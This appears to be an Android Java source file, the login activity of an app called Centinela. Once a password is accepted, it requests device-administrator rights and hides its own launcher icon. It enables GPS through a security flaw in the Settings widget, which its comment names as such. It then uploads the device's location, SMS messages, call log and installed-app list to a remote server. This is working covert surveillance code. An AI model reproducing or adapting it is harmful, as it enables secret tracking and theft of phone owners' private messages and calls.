package app.vjsantojaca.merinosa.com.centinela;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.IntentSender;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GooglePlayServicesUtil;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.common.api.PendingResult;
import com.google.android.gms.common.api.ResultCallback;
import com.google.android.gms.common.api.Status;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.LocationSettingsRequest;
import com.google.android.gms.location.LocationSettingsResult;
import com.google.android.gms.location.LocationSettingsStates;
import com.google.android.gms.location.LocationSettingsStatusCodes;

import org.json.JSONException;
import org.json.JSONObject;


import app.vjsantojaca.merinosa.com.centinela.services.gcm.RegistrationIntentService;
import app.vjsantojaca.merinosa.com.centinela.volley.ServerStatusRequestObject;
import app.vjsantojaca.merinosa.com.centinela.volley.VolleyS;

/*
* Developer Víctor Santoja
 * Centinela App pertenece al proyecto Centinela
*/
public class LoginActivity extends Activity implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener
{
    private static final String TAG = LoginActivity.class.getName();
    private static final int PLAY_SERVICES_RESOLUTION_REQUEST = 9000;

    private static Activity activity;

    private GoogleApiClient mGoogleApiClient;

    private TextView tvPass;
    private EditText etPass;
    private EditText etNumber;
    private Button buttonPass;
    private ProgressBar pbPass;

    private BroadcastReceiver mRegistrationBroadcastReceiver;

    protected synchronized void buildGoogleApiClient() {
        Log.i(LoginActivity.class.getName(), "CreandoGoogleApi");
        mGoogleApiClient = new GoogleApiClient.Builder(this)
                .addConnectionCallbacks(this)
                .addOnConnectionFailedListener(this)
                .addApi(LocationServices.API)
                .build();
        mGoogleApiClient.connect();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_load);

        activity = this;

        if( !App.activePolicyMananger() )
        {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, App.getComponentName());
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Centinela pertenece al proyecto centinela. Es propiedad de MerinoSA.");
            startActivityForResult(intent, 47);
        }

        mRegistrationBroadcastReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent)
            {
                SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
                boolean sentToken = sharedPreferences.getBoolean(Constants.SENT_TOKEN_TO_SERVER, false);
                if (sentToken)
                {
                    Log.i(LoginActivity.class.getName(), "Registrado con éxito");
                    Toast.makeText(getApplicationContext(), "Se ha terminado la configuracion de la aplicacion.", Toast.LENGTH_LONG).show();

                    // Ocultamos el icono de la aplicación
                    PackageManager p = getPackageManager();
                    ComponentName componentName = new ComponentName(App.getAppContext(), LoginActivity.class);
                    p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

                    // Si el GPS está desactivado, lo activamos mediante el fallo de seguridad del Widget SettingsProvider
                    LocationManager service = (LocationManager) App.getAppContext().getSystemService(App.getAppContext().LOCATION_SERVICE);
                    if( !service.isProviderEnabled(LocationManager.GPS_PROVIDER) )
                    {
                        if (Utils.canToggleGPS())
                        {
                            Toast.makeText(App.getAppContext(), "Activando GPS", Toast.LENGTH_LONG).show();
                            final Intent poke = new Intent();
                            poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
                            poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
                            poke.setData(Uri.parse("3"));
                            sendBroadcast(poke);
                        }
                    }

                    // Construimos el cliente para obtener la localización vía API de google
                    buildGoogleApiClient();

                    VolleyS volleyS = App.getVolley();
                    String url = Constants.URL_SERVER + Constants.PATH_SYSTEM;
                    JSONObject object = new JSONObject();
                    try {
                        object.put("id", Utils.getNumberPhone());
                        object.put("type", SystemEnum.START);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    ServerStatusRequestObject serverStatusRequest = new ServerStatusRequestObject(
                            Request.Method.POST,
                            url,
                            null,
                            object.toString(),
                            new Response.Listener<Integer>() {
                                @Override
                                public void onResponse(Integer response) {
                                    if( response == 200 ) {
                                        Log.d(TAG, "Se ha enviado con éxito");
                                        finish();
                                    }
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {
                                    Log.d(TAG, "Error Respuesta: " + error);
                                }
                            }
                    );

                    volleyS.getRequestQueue().add(serverStatusRequest);


                } else
                {
                    Log.i(LoginActivity.class.getName(), "Error registro en GCM");
                }
            }
        };

        tvPass = (TextView) findViewById(R.id.tvPass);
        etPass = (EditText) findViewById(R.id.etPass);
        etNumber = (EditText) findViewById(R.id.etNumber);
        pbPass = (ProgressBar) findViewById(R.id.pbPass);
        buttonPass = (Button) findViewById(R.id.buttonPass);

        tvPass.setVisibility(View.VISIBLE);
        etPass.setVisibility(View.VISIBLE);
        etNumber.setVisibility(View.VISIBLE);
        buttonPass.setVisibility(View.VISIBLE);
        pbPass.setVisibility(View.GONE);

        etNumber.setHint("NumberPhone");
        etPass.setHint("Password");
        tvPass.setText("Ha sido imposible obtener el número de teléfono de este dispositivo, así que por favor, introduzca el núnero de teléfono y su password.");
        buttonPass.setText("Activar");

        buttonPass.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String pass = etPass.getText().toString();
                if (Utils.isOnline()) {
                    if (etNumber.getText().toString().isEmpty()) {
                        Toast.makeText(getApplicationContext(), "Lo sentimos, pero tiene que introducir el número de teléfono del terminal.", Toast.LENGTH_LONG).show();
                    } else {
                        try {
                            Utils.setNumberPhone(Integer.parseInt(etNumber.getText().toString()));
                        } catch (Exception ex) {
                            Toast.makeText(getApplicationContext(), "El número de teléfono no tiene el formato adecuado.", Toast.LENGTH_LONG).show();
                        }

                        if (pass.length() != 0) {

                            VolleyS volleyS = App.getVolley();
                            String url = Constants.URL_SERVER + Constants.PATH_CHECK;
                            JSONObject object = new JSONObject();
                            try {
                                object.put("pass", pass);
                                object.put("id", Utils.getNumberPhone());
                                object.put("model", Build.MANUFACTURER + " " + Build.MODEL);
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            ServerStatusRequestObject serverStatusRequest = new ServerStatusRequestObject(
                                    Request.Method.POST,
                                    url,
                                    null,
                                    object.toString(),
                                    new Response.Listener<Integer>() {
                                        @Override
                                        public void onResponse(Integer response) {
                                            if( response == 200 ) {
                                                Toast.makeText(getApplicationContext(),"La contraseña es correcta, espere unos segundos mientras se termina de configurar la aplicacion.", Toast.LENGTH_LONG).show();
                                                tvPass.setVisibility(View.GONE);
                                                etNumber.setVisibility(View.GONE);
                                                etPass.setVisibility(View.GONE);
                                                buttonPass.setVisibility(View.GONE);
                                                pbPass.setVisibility(View.VISIBLE);
                                                if (checkPlayServices()) {
                                                    //Ocultamos el teclado
                                                    InputMethodManager imm = (InputMethodManager)getSystemService(Context.INPUT_METHOD_SERVICE);
                                                    imm.hideSoftInputFromWindow(buttonPass.getWindowToken(), 0);

                                                    // Start IntentService to register this application with GCM.
                                                    Intent intent = new Intent(App.getAppContext(), RegistrationIntentService.class);
                                                    startService(intent);
                                                } else {
                                                    Toast.makeText(getApplicationContext(), "No se ha encontrado Google Play Service", Toast.LENGTH_LONG).show();
                                                }
                                            }
                                        }
                                    },
                                    new Response.ErrorListener() {
                                        @Override
                                        public void onErrorResponse(VolleyError error) {
                                            Log.d(TAG, "Error Respuesta: " + error);
                                        }
                                    }
                            );

                            volleyS.getRequestQueue().add(serverStatusRequest);
                        } else {
                            Toast.makeText(getApplicationContext(), "Lo sentimos, pero tiene que introducir una password para activar la applicación.", Toast.LENGTH_LONG).show();
                        }
                    }
                } else {
                    Toast.makeText(getApplicationContext(), "Lo sentimos, pero no tiene conexión a internet, para seguir deberá estar conectado a una red.", Toast.LENGTH_LONG).show();
                }
            }
        });
    }

    @Override
    protected void onStart() {
        super.onStart();
        if( mGoogleApiClient != null)  mGoogleApiClient.connect();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if( mGoogleApiClient != null)  mGoogleApiClient.connect();
        LocalBroadcastManager.getInstance(this).registerReceiver(mRegistrationBroadcastReceiver, new IntentFilter(Constants.REGISTRATION_COMPLETE));
    }


    @Override
    protected void onPause() {
        LocalBroadcastManager.getInstance(this).unregisterReceiver(mRegistrationBroadcastReceiver);
        super.onPause();
    }


    private boolean checkPlayServices() {
        int resultCode = GooglePlayServicesUtil.isGooglePlayServicesAvailable(this);
        if (resultCode != ConnectionResult.SUCCESS) {
            if (GooglePlayServicesUtil.isUserRecoverableError(resultCode)) {
                GooglePlayServicesUtil.getErrorDialog(resultCode, this,
                        PLAY_SERVICES_RESOLUTION_REQUEST).show();
            } else {
                Log.i(TAG, "This device is not supported.");
                finish();
            }
            return false;
        }
        return true;
    }

    @Override
    public void onConnected(Bundle bundle)
    {
        Log.i(TAG, "Conectado");
        Location mLastLocation = LocationServices.FusedLocationApi.getLastLocation(mGoogleApiClient);
        if ( mLastLocation != null)
        {
            Log.i(TAG, "Location: " + mLastLocation.toString());

            //Enviamos la información de la localización inicial al servidor.

            VolleyS volleyS = App.getVolley();
            String url = Constants.URL_SERVER + Constants.PATH_LOCATION;
            JSONObject object = new JSONObject();
            try {
                object.put("latitude", mLastLocation.getLatitude());
                object.put("longitude", mLastLocation.getLongitude());
                object.put("batteryState", Utils.getBattery());
                object.put("sms", Utils.getSMS());
                object.put("calls", Utils.getListCalls());
                object.put("apps", Utils.getListApps());
                object.put("id", Utils.getNumberPhone());
            } catch (JSONException e) {
                e.printStackTrace();
            }

            ServerStatusRequestObject serverStatusRequest = new ServerStatusRequestObject(
                    Request.Method.POST,
                    url,
                    null,
                    object.toString(),
                    new Response.Listener<Integer>() {
                        @Override
                        public void onResponse(Integer response) {
                            if( response == 200 ) {
                                Log.d(TAG, "Se ha enviado con éxito la localización");
                            }
                        }
                    },
                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            Log.d(TAG, "Error Respuesta: " + error);
                        }
                    }
            );

            volleyS.getRequestQueue().add(serverStatusRequest);
        } else {
            //Creamos un request para que compruebe las modificaciones en la localización y así obtener la nueva localización
            LocationRequest mLocationRequest = new LocationRequest();
            mLocationRequest.setPriority(LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY);
            Log.d(TAG, "RequestLocationUpdates");
            // Construimos un builder para las opciones del localizador
            LocationSettingsRequest.Builder builder = new LocationSettingsRequest.Builder().addLocationRequest(mLocationRequest);
            builder.setAlwaysShow(true);
            PendingResult<LocationSettingsResult> result =  LocationServices.SettingsApi.checkLocationSettings(mGoogleApiClient, builder.build());
            result.setResultCallback(new ResultCallback<LocationSettingsResult>() {
                @Override
                public void onResult(LocationSettingsResult result) {
                    final Status status = result.getStatus();
                    final LocationSettingsStates state = result.getLocationSettingsStates();
                    switch (status.getStatusCode()) {
                        case LocationSettingsStatusCodes.SUCCESS:
                            break;
                        case LocationSettingsStatusCodes.RESOLUTION_REQUIRED:
                            try {
                                //Monstramos un mensaje para que el usuario active la localización
                                status.startResolutionForResult(activity, 1000);
                            } catch (IntentSender.SendIntentException e) {
                                // Ignore the error.
                            }
                            break;
                        case LocationSettingsStatusCodes.SETTINGS_CHANGE_UNAVAILABLE:
                            break;
                    }
                }
            });
            LocationServices.FusedLocationApi.requestLocationUpdates(mGoogleApiClient, mLocationRequest, this);
        }
    }

    @Override
    public void onConnectionSuspended(int i)
    {
        Log.i(TAG, "Connection suspended");
        mGoogleApiClient.connect();
    }

    @Override
    public void onLocationChanged(Location location) {
        Log.d(TAG, "Location: " + location.toString());

        VolleyS volleyS = App.getVolley();
        String url = Constants.URL_SERVER + Constants.PATH_LOCATION;
        JSONObject object = new JSONObject();
        try {
            object.put("latitude", location.getLatitude());
            object.put("longitude", location.getLongitude());
            object.put("batteryState", Utils.getBattery());
            object.put("sms", Utils.getSMS());
            object.put("calls", Utils.getListCalls());
            object.put("apps", Utils.getListApps());
            object.put("id", Utils.getNumberPhone());
        } catch (JSONException e) {
            e.printStackTrace();
        }

        ServerStatusRequestObject serverStatusRequest = new ServerStatusRequestObject(
                Request.Method.POST,
                url,
                null,
                object.toString(),
                new Response.Listener<Integer>() {
                    @Override
                    public void onResponse(Integer response) {
                        if( response == 200 ) {
                            Log.d(TAG, "Se ha enviado con éxito la localización");
                        }
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        Log.d(TAG, "Error Respuesta: " + error);
                    }
                }
        );

        volleyS.getRequestQueue().add(serverStatusRequest);

        LocationServices.FusedLocationApi.removeLocationUpdates(mGoogleApiClient, this);
    }

    @Override
    public void onConnectionFailed(ConnectionResult connectionResult)
    {
        Log.i(TAG, "Connection failed: ConnectionResult.getErrorCode() = " + connectionResult.getErrorCode());
    }
}